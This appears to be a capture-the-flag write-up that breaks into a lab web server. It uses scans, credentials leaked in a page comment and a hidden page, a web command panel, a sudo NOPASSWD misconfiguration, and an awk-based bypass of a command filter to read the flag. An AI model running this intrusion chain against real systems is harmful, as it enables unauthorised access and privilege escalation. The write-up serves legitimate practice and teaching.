# Prove You're a h4ck3rz: Cracking the 42sh Portal

## Techniques used

- Service/version scanning
- Source code / HTML comment inspection
- `robots.txt` disallow entry discovery
- Directory/file brute-forcing
- Web login form authentication
- Web-based command shell abuse
- Sudo misconfiguration privilege escalation
- Command filter bypass
- Base64 decoding (decoy)

## Tools used

- nmap
- curl
- gobuster
- web browser / curl (POST login)
- bash / awk
- base64

## Commands and output

### 1. Port scan

```bash
$ nmap -sV 10.10.0.48
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
```

### 2. Service/script scan

```bash
$ nmap -sC -sV 10.10.0.48
```

```text
| http-robots.txt: 1 disallowed entry 
|_/1337_53CR37_l41r
|_http-title: my 42sh
```

### 3. Hidden HTML comment on the homepage

```bash
$ curl -s http://10.10.0.48/ | grep -i -E "todo|fixme|pass|user|key|secret"
```

```text
Remember username: d4rk_T1t0u4N
```

A leaked username, left in a comment meant only for the site owner ("STOP READING if you're not me!").

### 4. Following the robots.txt disallow entry

```bash
$ curl -s http://10.10.0.48/robots.txt
```

```text
User-agent: *
Disallow: /1337_53CR37_l41r
```

The disallowed path is not protected, only hidden from crawlers — visiting it directly works.

### 5. Reading the hidden page

```bash
$ curl -s http://10.10.0.48/1337_53CR37_l41r/
```

```text
<p>Just in case I forgot, password to my super future 42sh: 8ES7_SHeLL_Ev4H</p>
```

A themed page (green-on-black terminal font, `42sh.png` banner) revealing a password tied to the "42sh" application rather than SSH.

### 6. Directory brute-force on the web root

```bash
$ gobuster dir -u http://10.10.0.48 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak,zip,git --exclude-length 315
```

```text
assets               (Status: 301) [Size: 349] [--> http://10.10.0.48/assets/]
index.html           (Status: 200) [Size: 1270]
login.php            (Status: 200) [Size: 1310]
portal.php           (Status: 302) [Size: 0] [--> /login.php]
robots.txt           (Status: 200) [Size: 42]
```

`portal.php` redirects to `login.php` when unauthenticated, confirming a login-gated area.

### 7. Logging in

Using the leaked credentials on `login.php`:

```text
username: d4rk_T1t0u4N
password: 8ES7_SHeLL_Ev4H
```

Successful login grants access to `portal.php`, a "Shell Panel" with a text field executing arbitrary commands as `www-data`.

### 8. Checking sudo privileges from the shell panel

Command submitted via the panel's `command` field: `sudo -l`

```text
Matching Defaults entries for www-data on h4xx0r_pc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on h4xx0r_pc:
    (titouan) NOPASSWD: ALL
```

`www-data` can run **any** command as `titouan` without a password — a critical misconfiguration.

### 9. The base64 decoy comment

```bash
$ echo "YUdGMlpTQjViM1VnYUdWaGNtUWdiMllnWVNCeVlXSmlhWFFnYUc5c1pTQS9JRmx2ZFNCemFHOTFiR1FnYkc5dmF5QnBkQ0IxY0N3Z2VXOTFJR3AxYzNRZ1ptVnNiQ0JwYmlCdmJtVmNJUT09" | base64 -d
```

```text
aGF2ZSB5b3UgaGVhcmQgb2YgYSByYWJiaXQgaG9sZSA/IFlvdSBzaG91bGQgbG9vayBpdCB1cCwgeW91IGp1c3QgZmVsbCBpbiBvbmVcIQ==
```

Decoding again just returns the same phrase re-encoded ("have you heard of a rabbit hole? You should look it up, you just fell in one!") — a pure troll with no bearing on privilege escalation.

### 10. Escalating to titouan

```bash
$ sudo -u titouan id
```

```text
uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

### 11. Bypassing the command filter to read the flag

Direct attempts were blocked:

```text
Command contain some forbidden keywords. Disabled to prevent dirty hackers, never too cautious
```

`cat` was filtered. Using `awk` instead bypassed the filter:

```bash
$ sudo -u titouan awk '{print}' /home/titouan/user.txt
```

```text
EPI{71me_70_D0_7H05E_NcuR5e2}
```

## Evidence

- Username: `d4rk_T1t0u4N`
- Web portal password: `8ES7_SHeLL_Ev4H`
- Sudo misconfiguration: `(titouan) NOPASSWD: ALL` for `www-data`
- Filter bypass command: `sudo -u titouan awk '{print}' /home/titouan/user.txt`
- Flag: `EPI{71me_70_D0_7H05E_NcuR5e2}`